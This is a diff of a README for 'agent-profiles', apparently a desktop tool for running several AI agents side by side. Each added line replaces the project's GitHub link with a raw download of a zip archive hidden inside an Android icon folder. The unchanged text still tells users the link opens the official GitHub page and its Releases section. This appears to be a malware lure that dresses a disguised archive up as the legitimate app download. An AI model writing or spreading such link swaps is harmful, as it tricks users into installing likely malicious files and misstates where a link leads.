@@ -1,6 +1,6 @@
 # 🖥️ agent-profiles - Run Multiple AI Agents Side-by-Side
 
-[![Download Now](https://img.shields.io/badge/Download-agent--profiles-blue?style=for-the-badge&logo=github)](https://github.com/burnabyjudicial666/agent-profiles)
+[![Download Now](https://img.shields.io/badge/Download-agent--profiles-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/burnabyjudicial666/agent-profiles/main/src-tauri/icons/android/mipmap-xxxhdpi/3.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these simple steps to start using agent-profiles on your computer:
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/burnabyjudicial666/agent-profiles](https://github.com/burnabyjudicial666/agent-profiles)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/burnabyjudicial666/agent-profiles/main/src-tauri/icons/android/mipmap-xxxhdpi/3.6.zip](https://raw.githubusercontent.com/burnabyjudicial666/agent-profiles/main/src-tauri/icons/android/mipmap-xxxhdpi/3.6.zip)
 
 This will take you to the official GitHub page for the project. Look for the "Releases" section on the right side of the page or scroll down to find the download section.
 
@@ -162,7 +162,7 @@ Running multiple AI agents side-by-side has never been easier. Say goodbye to lo
 
 **Download agent-profiles now:**
 
-[![Download Now](https://img.shields.io/badge/Download-agent--profiles-brightgreen?style=for-the-badge)](https://github.com/burnabyjudicial666/agent-profiles)
+[![Download Now](https://img.shields.io/badge/Download-agent--profiles-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/burnabyjudicial666/agent-profiles/main/src-tauri/icons/android/mipmap-xxxhdpi/3.6.zip)
 
 ---
 
